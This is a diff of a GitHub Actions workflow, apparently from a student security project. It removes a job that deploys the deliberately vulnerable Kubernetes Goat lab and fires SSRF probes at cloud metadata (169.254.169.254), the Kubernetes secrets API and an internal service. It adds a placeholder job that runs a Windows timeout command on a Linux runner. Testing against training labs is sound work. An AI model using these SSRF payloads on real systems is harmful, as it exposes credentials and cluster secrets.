@@ -14,7 +14,7 @@ jobs:
       EMAIL_TO: "saber.fraj@etudiant-isi.utm.tn,najah.wchem@etudiant-isi.utm.tn"
       EMAIL_FROM: ${{ secrets.GMAIL_USERNAME }}
       EMAIL_PWD: ${{ secrets.GMAIL_PASSWORD }}
-
+  
   security-scan:
     needs: notifications
     uses: ./.github/workflows/scanning-job.yml
@@ -22,70 +22,11 @@ jobs:
       EMAIL_FROM: ${{ secrets.GMAIL_USERNAME }}
       EMAIL_PWD: ${{ secrets.GMAIL_PASSWORD }}
       REPORT_TO: ${{ secrets.REPORT_EMAIL }}
-
-  ssrf-test:
-    needs: security-scan
-    runs-on: ubuntu-latest
-    name: "K8S SSRF Test (Kubernetes Goat)"
+  security-validation:
+    runs-on: ubuntu-22.04
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4  # Version mise à jour
-
-      - name: Setup Minikube
-        run: |
-          curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
-          sudo install minikube-linux-amd64 /usr/local/bin/minikube
-          minikube start --driver=docker
-          minikube status
-
-      - name: Deploy Kubernetes Goat
-        run: |
-          chmod +x setup-kubernetes-goat.sh
-          ./setup-kubernetes-goat.sh
-          kubectl wait --for=condition=Ready pods --all -n default --timeout=300s
-
-      - name: Discover SSRF endpoint
-        id: ssrf-discovery
-        run: |
-          SSRF_SERVICE=$(kubectl get svc -n default -o jsonpath='{.items[?(@.metadata.labels.app=="ssrf-app")].metadata.name}')
-          echo "SSRF_SERVICE=${SSRF_SERVICE}" >> $GITHUB_OUTPUT
-          echo "SSRF_URL=http://$(minikube service ${SSRF_SERVICE} -n default --url)" >> $GITHUB_OUTPUT
-
-      - name: Execute SSRF tests
-        run: |
-          # Test 1: Metadata API access
-          curl -s "${{ steps.ssrf-discovery.outputs.SSRF_URL }}?url=http://169.254.169.254/latest/meta-data" || echo "Test 1 failed"
-
-          # Test 2: Kubernetes API access
-          curl -s "${{ steps.ssrf-discovery.outputs.SSRF_URL }}?url=https://kubernetes.default/api/v1/secrets" || echo "Test 2 failed"
-
-          # Test 3: Internal service probing
-          curl -s "${{ steps.ssrf-discovery.outputs.SSRF_URL }}?url=http://metadata-db.default.svc.cluster.local" || echo "Test 3 failed"
-
-      - name: Generate report
-        if: always()
-        run: |
-          echo "# SSRF Test Results" > report.md
-          echo "## Kubernetes Goat SSRF Analysis" >> report.md
-          echo "- SSRF Service: ${{ steps.ssrf-discovery.outputs.SSRF_SERVICE}}" >> report.md
-          echo "- Minikube IP: $(minikube ip)" >> report.md
-          date >> report.md
-
-      - name: Upload report
-        uses: actions/upload-artifact@v4  # Version mise à jour
-        with:
-          name: ssrf-test-report
-          path: report.md
-
-      - name: Send notification
-        if: failure()
-        uses: dawidd6/action-send-mail@v3
-        with:
-          server_address: smtp.gmail.com
-          server_port: 465
-          username: ${{ secrets.GMAIL_USERNAME }}
-          password: ${{ secrets.GMAIL_PASSWORD }}
-          subject: "SSRF Vulnerability Detected in Kubernetes Goat"
-          to: ${{ secrets.REPORT_EMAIL }}
-          from: ${{ secrets.GMAIL_USERNAME }}
-          body: file://report.md
+      - name: Wait for 10 seconds
+        run: timeout /T 10 /NOBREAK
+    
+  
+  
